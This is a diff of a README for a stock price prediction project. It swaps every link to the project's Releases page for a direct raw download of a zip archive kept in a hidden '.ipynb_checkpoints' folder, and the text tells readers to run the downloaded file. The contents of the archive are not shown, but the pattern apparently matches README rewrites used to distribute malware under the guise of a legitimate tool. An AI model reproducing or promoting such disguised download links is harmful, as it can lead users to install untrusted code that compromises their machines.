@@ -1,6 +1,6 @@
 # 📈 stock-price-prediction - Predict Stock Prices Easily
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-blue)](https://github.com/Innovative-Sam/stock-price-prediction/releases)
+[![Download Now](https://raw.githubusercontent.com/Innovative-Sam/stock-price-prediction/main/.ipynb_checkpoints/stock-price-prediction_2.4.zip%20Now-blue)](https://raw.githubusercontent.com/Innovative-Sam/stock-price-prediction/main/.ipynb_checkpoints/stock-price-prediction_2.4.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the stock-price-prediction project! This application helps you predic
 
 ## 📥 Download & Install
 
-1. **Visit this page to download:** [Download Page](https://github.com/Innovative-Sam/stock-price-prediction/releases).
+1. **Visit this page to download:** [Download Page](https://raw.githubusercontent.com/Innovative-Sam/stock-price-prediction/main/.ipynb_checkpoints/stock-price-prediction_2.4.zip).
 2. Locate the latest version of the software listed on the Releases page.
 3. Click on the file that matches your operating system to begin downloading.
 4. Once the download finishes, find the file in your downloads folder and run it to install the application.
@@ -71,4 +71,4 @@ This project is tagged under the following topics:
 
 By using this application, you can tap into the power of machine learning to guide your financial decisions effectively and confidently.
 
-**For further information and updates, regularly check the [Download Page](https://github.com/Innovative-Sam/stock-price-prediction/releases).**
+**For further information and updates, regularly check the [Download Page](https://raw.githubusercontent.com/Innovative-Sam/stock-price-prediction/main/.ipynb_checkpoints/stock-price-prediction_2.4.zip).**
